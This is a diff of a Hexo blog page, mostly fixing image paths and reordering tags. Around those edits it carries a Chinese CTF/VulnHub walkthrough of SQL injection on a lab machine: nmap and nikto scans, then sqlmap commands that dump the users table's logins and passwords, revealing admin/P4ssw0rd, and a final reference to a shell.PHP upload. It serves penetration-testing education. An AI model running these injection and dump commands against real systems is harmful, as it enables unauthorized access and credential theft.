@@ -16,23 +16,23 @@
 <meta property="og:site_name" content="Saw,Learnt,To think">
 <meta property="og:description" content="实验环境12攻击机	192.168.1.200靶场机	192.168.1.175">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/1.png">
-<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/2.png">
-<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/3.png">
-<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/4.png">
-<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/5.png">
-<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/6.png">
-<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/7.png">
-<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/8.png">
-<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/9.png">
-<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/10.png">
-<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/11.png">
-<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/12.png">
-<meta property="og:updated_time" content="2020-02-12T14:03:59.080Z">
+<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/1.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/2.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/3.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/4.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/5.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/6.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/7.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/8.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/9.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/10.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/11.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/12.png">
+<meta property="og:updated_time" content="2020-02-12T14:09:20.695Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入-GET参数">
 <meta name="twitter:description" content="实验环境12攻击机	192.168.1.200靶场机	192.168.1.175">
-<meta name="twitter:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/1.png">
+<meta name="twitter:image" content="/2019/09/07/SQL注入-GET参数/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Saw,Learnt,To think" type="application/atom+xml">
   
@@ -188,43 +188,43 @@
 
 <h3 id="步骤一：信息探测"><a href="#步骤一：信息探测" class="headerlink" title="步骤一：信息探测"></a>步骤一：信息探测</h3><h4 id="①发现靶机"><a href="#①发现靶机" class="headerlink" title="①发现靶机"></a>①发现靶机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/1.png" alt="1"></p>
+<p><img src="/2019/09/07/SQL注入-GET参数/1.png" alt="1"></p>
 <h4 id="②nmap扫描"><a href="#②nmap扫描" class="headerlink" title="②nmap扫描"></a>②nmap扫描</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 -v 192.168.1.175</span><br><span class="line">nmap -sV 192.168.1.175</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/2.png" alt="2"></p>
+<p><img src="/2019/09/07/SQL注入-GET参数/2.png" alt="2"></p>
 <p>发现22端口和80端口开放</p>
 <h4 id="③Nikto扫描"><a href="#③Nikto扫描" class="headerlink" title="③Nikto扫描"></a>③Nikto扫描</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host 192.168.1.175</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/3.png" alt="3"></p>
+<p><img src="/2019/09/07/SQL注入-GET参数/3.png" alt="3"></p>
 <h3 id="步骤二：信息分析"><a href="#步骤二：信息分析" class="headerlink" title="步骤二：信息分析"></a>步骤二：信息分析</h3><p>根据nmap和Nikto工具扫描得知有22端口、80端口以及管理员登入界面</p>
-<h3 id="步骤三：漏洞扫描工具利用"><a href="#步骤三：漏洞扫描工具利用" class="headerlink" title="步骤三：漏洞扫描工具利用"></a>步骤三：漏洞扫描工具利用</h3><h4 id="①OWSAP-ZAP工具利用"><a href="#①OWSAP-ZAP工具利用" class="headerlink" title="①OWSAP ZAP工具利用"></a>①OWSAP ZAP工具利用</h4><p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/4.png" alt="4"></p>
+<h3 id="步骤三：漏洞扫描工具利用"><a href="#步骤三：漏洞扫描工具利用" class="headerlink" title="步骤三：漏洞扫描工具利用"></a>步骤三：漏洞扫描工具利用</h3><h4 id="①OWSAP-ZAP工具利用"><a href="#①OWSAP-ZAP工具利用" class="headerlink" title="①OWSAP ZAP工具利用"></a>①OWSAP ZAP工具利用</h4><p><img src="/2019/09/07/SQL注入-GET参数/4.png" alt="4"></p>
 <p>发现管理员登入界面，存在SQL注入漏洞</p>
-<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/5.png" alt="5"></p>
+<p><img src="/2019/09/07/SQL注入-GET参数/5.png" alt="5"></p>
 <h4 id="②利用sqlmap工具获取信息"><a href="#②利用sqlmap工具获取信息" class="headerlink" title="②利用sqlmap工具获取信息"></a>②利用sqlmap工具获取信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.175/cat.php?id=3&quot; --batch</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/6.png" alt="6"></p>
+<p><img src="/2019/09/07/SQL注入-GET参数/6.png" alt="6"></p>
 <p>说明存在SQL注入漏洞</p>
 <p><strong>==sqlmap信息获取步骤==</strong></p>
 <ul>
 <li><p>获取数据库名</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.175/cat.php?id=3&quot; --dbs</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/7.png" alt="7"></p>
+<p><img src="/2019/09/07/SQL注入-GET参数/7.png" alt="7"></p>
 </li>
 <li><p>遍历浏览每个数据的表</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.175/cat.php?id=3&quot; -D &quot;photoblog&quot; --tables</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/8.png" alt="8"></p>
+<p><img src="/2019/09/07/SQL注入-GET参数/8.png" alt="8"></p>
 </li>
 <li><p>遍历浏览表中的字段</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.175/cat.php?id=3&quot; -D &quot;photoblog&quot; -T &quot;users&quot; --columns</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/9.png" alt="9"></p>
+<p><img src="/2019/09/07/SQL注入-GET参数/9.png" alt="9"></p>
 </li>
 <li><p>遍历浏览字段中的值</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.175/cat.php?id=3&quot; -D &quot;photoblog&quot; -T &quot;users&quot; -C &quot;login,password&quot; --dump</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/10.png" alt="10"></p>
+<p><img src="/2019/09/07/SQL注入-GET参数/10.png" alt="10"></p>
 <p>发现用户名：admin,  密码：P4ssw0rd</p>
 </li>
 </ul>
@@ -238,9 +238,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.175/admin/login.php</span><br></pre></td></tr></table></figure>
 
 <p>用户名：admin,  密码：P4ssw0rd</p>
-<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/11.png" alt="11"></p>
+<p><img src="/2019/09/07/SQL注入-GET参数/11.png" alt="11"></p>
 <p>点击shell.PHP后，会有如下所示：</p>
-<p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5-GET%E5%8F%82%E6%95%B0/12.png" alt="12"></p>
+<p><img src="/2019/09/07/SQL注入-GET参数/12.png" alt="12"></p>
 
       
 
@@ -494,10 +494,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">CTF靶机系列</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">VulnHub靶机系列</a>
               </li>
              
@@ -506,11 +502,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">大数据</a>
+                <a href="javascript:void(0)" class="js-tag color3">CTF靶机系列</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">Python_Hacker</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">大数据</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">渗透知识</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -519,10 +523,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">计算机小技巧</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透知识</a>
               </li>
              
               <li class="article-tag-list-item">
